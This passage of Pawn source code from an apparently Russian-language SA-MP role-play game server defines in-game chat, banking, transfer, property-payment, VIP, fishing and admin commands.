	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
    noooc ^= 1;
	if(!noooc) SendClientMessageToAll(-1, " Общий чат отключён админом!");
	else SendClientMessageToAll(-1, " Общий чат включен админом!");
	return 1;
}
CMD:goverment(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(IsACop(playerid) || IsAArm(playerid) || IsAMayor(playerid) || IsAMedic(playerid) || IsALicenser(playerid))
	if(!GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Вам недоступен этот чат!");
	{
		new rtext[30];
		if(PTEMP[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
		if(sscanf(params, "s[128]", params[0])) return	SCM(playerid, -1, " Введите: (/gov)erment [текст]");
		if(PTEMP[playerid][pMember] == 1 || PTEMP[playerid][pLeader] == 1)
		{
			if(PTEMP[playerid][pRank] < 13) return true;
			if(PTEMP[playerid][pRank] == 13) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 14) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 2 || PTEMP[playerid][pLeader] == 2)
		{
			if(PTEMP[playerid][pRank] < 9) return true;
			if(PTEMP[playerid][pRank] == 9) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 10) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 3 || PTEMP[playerid][pLeader] == 3)
		{
			if(PTEMP[playerid][pRank] < 14) return true;
			if(PTEMP[playerid][pRank] == 14) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 15) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 4 || PTEMP[playerid][pLeader] == 4)
		{
			if(PTEMP[playerid][pRank] < 9) return true;
			if(PTEMP[playerid][pRank] == 10) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 9) { rtext = "Новости:"; }
			else { SCM(playerid,COLOR_GREY," Вам недоступна данная команда"); }
		}
		else if(PTEMP[playerid][pMember] == 7 || PTEMP[playerid][pLeader] == 7)
		{
			if(PTEMP[playerid][pRank] < 5) return true;
			if(PTEMP[playerid][pRank] == 5) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 6) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pLeader] == 10)
		{
			if(PTEMP[playerid][pRank] < 13) return true;
			if(PTEMP[playerid][pRank] == 13) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 14) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 11 || PTEMP[playerid][pLeader] == 11)
		{
			if(PTEMP[playerid][pRank] < 9) return true;
			if(PTEMP[playerid][pRank] == 9) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 10) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 19 || PTEMP[playerid][pLeader] == 19)
		{
			if(PTEMP[playerid][pRank] < 14) return true;
			if(PTEMP[playerid][pRank] == 14) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 15) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 21 || PTEMP[playerid][pLeader] == 21)
		{
			if(PTEMP[playerid][pRank] < 13) return true;
			if(PTEMP[playerid][pRank] == 13) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 14) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 22 || PTEMP[playerid][pLeader] == 7)
		{
			if(PTEMP[playerid][pRank] < 9) return true;
			if(PTEMP[playerid][pRank] == 10) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 9) { rtext = "Новости:"; }
		}
		else if(PTEMP[playerid][pMember] == 33 || PTEMP[playerid][pLeader] == 7)
		{
			if(PTEMP[playerid][pRank] < 9) return true;
			if(PTEMP[playerid][pRank] == 10) { rtext = "Новости:"; }
			else if(PTEMP[playerid][pRank] == 9) { rtext = "Новости:"; }
		}
		else { return true; }
		SendClientMessageToAll(-1, "-----------=== Государственные Новости ===-----------");
		format(YCMDstr, sizeof(YCMDstr), " %s %s: %s", rtext, PTEMP[playerid][pName], params[0]);
		SendClientMessageToAll(0x2641feaa, YCMDstr);
	}
	return true;
}
CMD:fstyle(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid,-1, " Введите: /fstyle [стиль 0, 1, 2, 3]");
	if(params[0] < 0 || params[0] > 3) return SCM(playerid,COLOR_GREY, " Стиль 0, 1, 2, 3");
	if(params[0] == 0)
	{
		SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
		SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
	}
	else if(params[0] == 1)
	{
		if(PTEMP[playerid][pBoxSkill] >= 5500) SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING), SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
		else return SCM(playerid,COLOR_GREY," Этот стиль боя, вам пока недоступен");
	}
	else if(params[0] == 2)
	{
		if(PTEMP[playerid][pKongfuSkill] >= 5500) SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU), SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
		else return SCM(playerid,COLOR_GREY," Этот стиль боя, вам пока недоступен");
	}
	else if(params[0] == 3)
	{
		if(PTEMP[playerid][pKickboxSkill] >= 5500) SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD), SCM(playerid, 0xff00ff, " Установлен новый стиль боя");
		else return SCM(playerid,COLOR_GREY," Этот стиль боя, вам пока недоступен");
	}
	return true;
}
CMD:balance(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Нужно находиться в банке");
	format(YCMDstr, sizeof(YCMDstr), " Баланс: %i вирт", PTEMP[playerid][pBank]);
	SCM(playerid, 0x6495edff, YCMDstr);
	return true;
}
CMD:donate(playerid)
{
	if(!PTEMP[playerid][pLogin]) return true;
	ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_INPUT, "Код #1", "===============================\n              Введите код №1\n===============================", "Далее", "Отмена");
	return true;
}
CMD:bizbank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!BGet(playerid))  return SCM(playerid, COLOR_GRAD2, "У вас нет бизнеса!");
	new bouse = PTEMP[playerid][pPBizzKey];
	if(sscanf(params, "dd", params[0],params[1])) return SCM(playerid, -1, " Введите: /bizbank [сумма] [1 - баланс банка | 2 - баланс оплаты электроэнергии]");
	if(params[0] < 1 || params[0] > (BizzLandTax[bouse]*720)-BizzInfo[bouse][bLandTax] && params[1] == 2)  return SendMes(playerid, COLOR_GRAD2, "Неверная сумма, максимально допустимая %i вирт", (BizzLandTax[bouse]*720)-BizzInfo[bouse][bLandTax]);
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Вы не в банке");
	if(PTEMP[playerid][pBank] < params[0]) return SCM(playerid, COLOR_GREY, " На банковском счету недостаточно средств");
	PTEMP[playerid][pBank] -= params[0];
	switch(params[1])
	{
	case 1: BizzInfo[bouse][bTill] += params[0], SendMes(playerid,0x6495EDFF," Вы перевели на счёт вашего бизнеса %i вирт",params[0]);
	case 2: BizzInfo[bouse][bLandTax] += params[0],SendMes(playerid,0x6495EDFF," Вы перевели на счёт вашего бизнеса %i вирт",params[0]);
	default: SCM(playerid,COLOR_GREY," Неверное значение!");
	}
	return true;
}
CMD:housebank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!HGet(playerid))  return SCM(playerid, COLOR_GRAD2, "У вас нет дома!");
	new bouse = PTEMP[playerid][pPHouseKey];
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /housebank [сумма]");
	new cc = 36150-HouseInfo[bouse][hTakings];
	if(params[0] < 1 || HouseInfo[bouse][hTakings]+params[0] > GetHouseOplata(PTEMP[playerid][pPHouseKey]))  return SendMes(playerid, COLOR_GRAD2, " Неверная сумма, максимально допустимая %i вирт",cc);
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Вы не в банке");
	if(PTEMP[playerid][pBank] < params[0]) return SCM(playerid, COLOR_GREY, " На банковском счету недостаточно средств");
	PTEMP[playerid][pBank] -= params[0];
	HouseInfo[bouse][hTakings]+= params[0], SendMes(playerid,0x6495EDFF," Вы перевели на счёт вашего дома %i вирт",params[0]);
	return true;
}
CMD:houseo(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /houseo [номер дома]");
	SetPlayerPos(playerid,HouseInfo[params[0]][hExitx],HouseInfo[params[0]][hExity],HouseInfo[params[0]][hExitz]);
	SetPlayerInterior(playerid,HouseInfo[params[0]][hInt]);
	SetPlayerVirtualWorld(playerid,params[0]+50);
	return true;
}
CMD:bank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsABank(playerid)) return SCM(playerid,COLOR_GREY," Нужно находиться в банке");
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /bank [сумма]");
		return true;
	}
	if(PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
//	if(params[0] > 100000000 || params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильное количество денег!"); return true; }
	PTEMP[playerid][pCash] -= params[0];
	PTEMP[playerid][pBank] += params[0];
	format(YCMDstr, sizeof(YCMDstr), " Вы пополнили счет на %i вирт. Баланс: %i вирт", params[0], PTEMP[playerid][pBank]);
	SCM(playerid, 0x6495edff, YCMDstr);
	return true;
}
CMD:whonear(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "fdd", params[0], params[1], params[2]) || params[2] > 1 || params[2] < 0) return SCM(playerid, -1, " Введите: /whonear [радиус в метрах] [лвл] [0 - равно и меньше, 1 - равно и больше]");
	new Float: POS[3], playername[MAX_PLAYER_NAME];
	GetPlayerPos(playerid, POS[0], POS[1], POS[2]);
	for(new i; i<MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || !IsPlayerInRangeOfPoint(playerid, params[0], POS[0], POS[1], POS[2])) continue;
		if(params[2] == 0 && PTEMP[i][pLevel] > params[1]) continue;
		if(params[2] == 1 && PTEMP[i][pLevel] < params[1]) continue;
		GetPlayerName(i, playername, MAX_PLAYER_NAME);
		format(string, 60, " %s [ID: %i]", playername, i);
		SCM(playerid, -1, string);
	}
	return 1;
}
CMD:transfer(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLevel] < 3) return SCM(playerid, COLOR_GREY, " Вы должны быть 3 уровня!");
	if(!IsABank(playerid)) return SCM(playerid, COLOR_GREY, " Нужно находиться в банке");
//	if(PTEMP[playerid][pPayDayHad] < 5) return SCM(playerid, COLOR_GRAD1, "Вы должны отыграть 5 часов!");
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /transfer [ник игрока] [сумма]");
	if (!IsPlayerConnected(params[0])) return true;
	if(params[1] > 0 && PTEMP[playerid][pBank] >= params[1])
	{
		PTEMP[playerid][pBank] -= params[1];
		PTEMP[params[0]][pBank] += params[1];
		format(YCMDstr, sizeof(YCMDstr), " Вы передали %i вирт, на счет %s [%i/%i/%i  %i:%i]", params[1], Name(params[0]), day1,month1,year1,hour1, minute1);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вы получили %i вирт, на свой счет от %s [%i/%i/%i  %i:%i]",params[1],Name(playerid), day1,month1,year1,hour1, minute1);
		SCM(params[0], COLOR_BLUE, YCMDstr);
		PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
	}
	printf("[TRANSFER] %s перевёл %s %i вирт", PTEMP[playerid][pName], PTEMP[params[0]][pName], params[1]);
	return true;
}
CMD:withdraw(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsABank(playerid)) return SCM(playerid, COLOR_GREY, " Нужно находиться в банке");
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /withdraw [сумма]");
		return true;
	}
//	if(params[0] < 1 || params[0] > 100000000) { SCM(playerid, COLOR_GREY, " Нельзя снять 1 вирта и более 100000000!"); return true; }
	if(PTEMP[playerid][pBank] < params[0]) return SCM(playerid, COLOR_GRAD1, " У вас нет столько денег!");
	PTEMP[playerid][pCash] += params[0];
	PTEMP[playerid][pBank] -= params[0];
	format(YCMDstr, sizeof(YCMDstr), " Вы сняли со счета %i вирт. Баланс: %i вирт",params[0], PTEMP[playerid][pBank]);
	SCM(playerid, 0x6495edff, YCMDstr);
	return true;
}
CMD:gethousemoney(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsABank(playerid)) return SCM(playerid, COLOR_GREY, " Вы не в банке!");
	if(PTEMP[playerid][pHousecash] <=0) return	SCM(playerid, COLOR_GRAD1, " Вас не выселяли"), PTEMP[playerid][pText] = 0;
	PTEMP[playerid][pCash] += PTEMP[playerid][pHousecash];
	format(YCMDstr, sizeof(YCMDstr), " Деньги переведены на ваш банковский счет", PTEMP[playerid][pHousecash]);
	SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
	PTEMP[playerid][pHousecash] = 0;
	PTEMP[playerid][pText] = 0;
	return true;
}
CMD:en(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 481 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 509 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 510) return SCM(playerid,-1,"Iaaiionoeiue o?ainii?o");
	if(GetPlayerVehicleID(playerid) == INVALID_VEHICLE_ID) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
	new vehicleid = GetPlayerVehicleID(playerid);
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	if(!engine)
	{
		if(Fuell[vehicleid] <= 0 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 462)
		{
			Fuell[vehicleid] = 0;
			GameTextForPlayer(playerid,"~r~FUEL HAS ENDED", 5000, 3);
			SCM(playerid, COLOR_RED, " Двигатель не заводится");
			SCM(playerid, COLOR_GREEN, " {00A86B}Используйте телефон {FFFFFF}(( /call )) {00A86B}чтобы вызвать механика / таксиста");
			SCM(playerid, COLOR_GREEN, " {00A86B}Если у вас есть канистра с бензином, введите {FFFFFF}(( /fillcar ))");
			return true;
		}
		if(CarHealth[GetPlayerVehicleID(playerid)] < 300) return GameTextForPlayer(playerid,"~r~ENGINE HAS BROKENED", 5000, 3);
		GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),true,true,alarm,doors,bonnet,boot,objective);
	}
	else
	{
		SetPVarInt(playerid,"not_engine",0);
		SetPVarInt(playerid,"not_engine_",0);
		GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),false,false,alarm,doors,bonnet,boot,objective);
	}
	return true;
}
CMD:hi(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GREY, " Нельзя использовать в машине");
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /hi [ид]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(2.0, playerid, params[0]) || IsPlayerInAnyVehicle(params[0])) return SCM(playerid, COLOR_GREY, " Игрок далеко от вас");
	if(params[0] == playerid)  return  SCM(playerid,COLOR_GRAD1, " [Ошибка] Вы указали свой ID");
	new Float:angle;
	GetPlayerFacingAngle(playerid, angle);
	SetPlayerFacingAngle(params[0], angle + 180);
	format(YCMDstr, sizeof(YCMDstr), " %s пожал руку %s'у",Name(playerid),Name(params[0]));
	ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	ApplyAnimation(playerid, "GANGS", "hndshkfa",4.0,0,0,0,0,0,1);
	ApplyAnimation(params[0], "GANGS", "hndshkfa",4.0,0,0,0,0,0,1);
	return true;
}
CMD:pee(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1) return true;
	SetPlayerSpecialAction(playerid, 68);
	return true;
}
CMD:viphelp(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	switch(PTEMP[playerid][pDonateRank])
	{
	case 0: SendMes(playerid,COLOR_GOLD," Донат счетчик: %i/1000000 вирт", PTEMP[playerid][pDonateAccount]);
	case 1: SendMes(playerid,COLOR_GOLD," Донат счетчик: %i/10000000 вирт", PTEMP[playerid][pDonateAccount]);
	case 2: SendMes(playerid,COLOR_GOLD," Донат счетчик: %i/30000000 вирт", PTEMP[playerid][pDonateAccount]);
	default: SendMes(playerid,COLOR_GOLD," Донат счетчик: %i вирт", PTEMP[playerid][pDonateAccount]);
	}
	SCM(playerid, 0xEAC700AA, " BRONZE: /togphone - вкл/выкл телефон");
	SCM(playerid, 0xEAC700AA, " SILVER: /admins - админы онлайн");
	SCM(playerid, 0xEAC700AA, " GOLD:   /vipuninvite - увольнение из организации");
	//SCM(playerid, COLOR_GOLD, "Дополнительный процент в банке 0.05%%");
	return true;
}
CMD:vipuninvite(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pDonateRank] < 3) return SCM(playerid, COLOR_GREY, " Только для пользователей VIP GOLD");
	if(PTEMP[playerid][pLeader] >= 1) return SCM(playerid,COLOR_GREY," Вы не состоите во фракции");
	if(PTEMP[playerid][pMember] > 0)
	{
		if(GetPVarInt(playerid,"capture_on"))
		{
			DeletePVar(playerid,"capture_on");
			PlayerTextDrawHide(playerid, Capture[playerid]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(playerid,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(playerid,"mafia_war"))
		{
			DeletePVar(playerid,"mafia_war");
			PlayerTextDrawHide(playerid, Capture[playerid]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(playerid,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		if(GetPVarInt(playerid,"biker_capt"))
		{
			DeletePVar(playerid,"biker_capt");
			PlayerTextDrawHide(playerid, Capture[playerid]);
			DestroyDynamic3DTextLabel(BikerText[playerid]);
			for(new i_ = 0; i_ < 5; i_++) { SendDeathMessageToPlayer(playerid,INVALID_PLAYER_ID-1, INVALID_PLAYER_ID-1, 0); }
		}
		PTEMP[playerid][pMember] = 0;
		PTEMP[playerid][pRank] = 0;
		PTEMP[playerid][pLeader] = 0;
		PTEMP[playerid][pJob] = 0;
		SetPlayerArmourAC(playerid,0);
		SetPlayerColor(playerid, TEAM_HIT_COLOR);
		SetPlayerSkin(playerid, PTEMP[playerid][pChar][0]);
		SCM(playerid, COLOR_BLUE, " Рабочий день окончен");
		SCM(playerid, COLOR_BLUE, " Вы снова гражданский");
	}
	return true;
}
CMD:togphone(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pDonateRank] >= 1 || PTEMP[playerid][pAdmin] >= 1 || PTEMP[playerid][pLeader] >= 1)
	{
		if(!PhoneOnline[playerid])
		{
			PhoneOnline[playerid] = 1;
			format(YCMDstr, sizeof(YCMDstr), " Ваш телефон выключен!",Name(playerid));
			SCM(playerid, -1, YCMDstr);
		}
		else if(PhoneOnline[playerid])
		{
			PhoneOnline[playerid] = 0;
			format(YCMDstr, sizeof(YCMDstr), " Ваш телефон включен!",Name(playerid));
			SCM(playerid, -1, YCMDstr);
		}
	}
	else
	{
		SCM(playerid, COLOR_GREY, " Вы не админ / лидер организации / VIP игрок!");
		return true;
	}
	return true;
}
CMD:me(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
 	 	SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"me");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(gettime() < (GetPVarInt(playerid, "SendMe") + 30))
    {
		if(GetPVarInt(playerid, "SendMeTimes") >= 3)
		{
			return SCM(playerid, COLOR_GREY, " Эту команду можно использовать не более 3 раз в 30 секунд");
		}
    }
	else SetPVarInt(playerid, "SendMeTimes", 0);
	
	if(PTEMP[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: /me [действие]");
	format(YCMDstr, sizeof(YCMDstr), " %s %s", Name(playerid), params[0]);
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPlayerChatBubble(playerid,params[0],COLOR_PURPLE,30.0,10000);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	SetPVarInt(playerid, "SendMeTimes", GetPVarInt(playerid, "SendMeTimes")+1);
	SetPVarInt(playerid, "SendMe", gettime());
	return true;
}
CMD:do(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"do");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(gettime() < (GetPVarInt(playerid, "SendDo") + 30))
    {
		if(GetPVarInt(playerid, "SendDoTimes") >= 3)
		{
			return SCM(playerid, COLOR_GREY, " Эту команду можно использовать не более 3 раз в 30 секунд");
		}
    }
	else SetPVarInt(playerid, "SendDoTimes", 0);
	if(PTEMP[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: /do [действие]");
	format(YCMDstr, 144, " {FFFFFF}(( %s[%i] )) {FF8000}%s",PTEMP[playerid][pName],playerid, params[0]);
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPlayerChatBubble(playerid,params[0],0xFF9900AA,30.0,10000);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	SetPVarInt(playerid, "SendDoTimes", GetPVarInt(playerid, "SendDoTimes")+1);
	SetPVarInt(playerid, "SendDo", gettime());
	return true;
}
CMD:try(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"try");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(gettime() < (GetPVarInt(playerid, "SendTry") + 30))
    {
		if(GetPVarInt(playerid, "SendTryTimes") >= 3)
		{
			return SCM(playerid, COLOR_GREY, " Эту команду можно использовать не более 3 раз в 30 секунд");
		}
    }
	else SetPVarInt(playerid, "SendTryTimes", 0);
	if(PTEMP[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: /try [действие]");
	new randomchik = Random(0,2);
	format(YCMDstr, sizeof(YCMDstr), " %s %s %s",Name(playerid),params[0],(!randomchik)?("{00AB06} [Удачно]") : ("{C42100} [Неудачно]"));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPlayerChatBubble(playerid,params[0],COLOR_PURPLE,30.0,10000);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	SetPVarInt(playerid, "SendTryTimes", GetPVarInt(playerid, "SendTryTimes")+1);
	SetPVarInt(playerid, "SendTry", gettime());
	return true;
}
CMD:todo(playerid, params[])
{
    if(PTEMP[playerid][pLogin] == 0) return true;
    new data_temp_text_todo[128], data_temp_string[54], data_player_name[24];
	GetPlayerName(playerid, data_player_name, 24);
    if(sscanf(params, "s[128]", data_temp_text_todo)) return SendClientMessage(playerid, -1, " Введите: /todo [Фраза*Действие]");
    if(strfind(data_temp_text_todo, "*") == -1) return SendClientMessage(playerid, -1, " Введите: /todo [Фраза*Действие]");
    format(data_temp_string, sizeof(data_temp_string), "', {C2A2DA}- сказал %s, ", data_player_name);
    new data_of_token = strfind(data_temp_text_todo, "*");
    strdel(data_temp_text_todo, strfind(data_temp_text_todo, "*"), strfind(data_temp_text_todo, "*")+1);
    strins(data_temp_text_todo, data_temp_string, data_of_token);
    strins(data_temp_text_todo, "'", 0);
    SetPlayerChatBubble(playerid, data_temp_text_todo, 0x6495EDFF, 20.0, 10000);
    ProxDetector(20.0, playerid, data_temp_text_todo, 0xE6E6E6E6,0xC8C8C8C8,0xAAAAAAAA,0x8C8C8C8C,0x6E6E6E6E);
    return 1;
}
CMD:shout(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"крикнул");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(PTEMP[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: (/s)hout [текст]");
	format(YCMDstr, sizeof(YCMDstr), " %s крикнул: %s!!",Name(playerid),params[0]);
	ProxDetector(60.0, playerid, YCMDstr,-1,-1,-1,COLOR_FADE1,COLOR_FADE2);
	Flood[playerid] = 1;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) ApplyAnimation(playerid, "RIOT", "RIOT_shout", 2000.0, 0, 1, 1, 1, 1, 1), SetTimerEx("ClearAnim", 800, false, "d", playerid);
	SetPlayerChatBubble(playerid,params[0],COLOR_YELLOW,60.0,10000);
	SetPVarInt(playerid,"Flood",0);
	return true;
}
CMD:fish(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nПродать рыбу\nИнформация\nПомощь", "Выбор", "Выход");
	return true;
}
CMD:quest(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	ShowPlayerDialogEx(playerid,1343,DIALOG_STYLE_LIST, "Управление квестами","Текущий квест\nВыбор сюжетной линии [Временно не работает]\nСтатистика\nЧужая статистика", "Далее", "Выход");
	return true;
}
CMD:licenses(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	SCM(playerid, 0x59bd3aa, "-----------===[ LICENSES ]===-----------");
	format(YCMDstr, sizeof(YCMDstr), " Водительские права:  %s",(!PTEMP[playerid][pCarLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия пилота:  %s",(!PTEMP[playerid][pFlyLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия на катера:  %s",(!PTEMP[playerid][pBoatLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия рыболова:  %s",(!PTEMP[playerid][pFishLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
